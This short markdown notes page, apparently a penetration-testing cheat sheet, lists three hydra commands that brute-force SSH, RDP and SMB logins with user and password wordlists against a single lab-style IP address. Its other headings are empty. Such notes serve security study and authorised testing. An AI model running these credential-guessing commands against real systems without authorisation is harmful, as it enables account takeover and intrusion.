# Overview



# Resources


# Usage

Bruteforce SSH
```bash
hydra -L user.list -P password.list ssh://10.129.42.197
```

Bruteforce RDP
```bash
hydra -L user.list -P password.list rdp://10.129.42.197
```

Bruteforce SMB
```bash
hydra -L user.list -P password.list smb://10.129.42.197
```
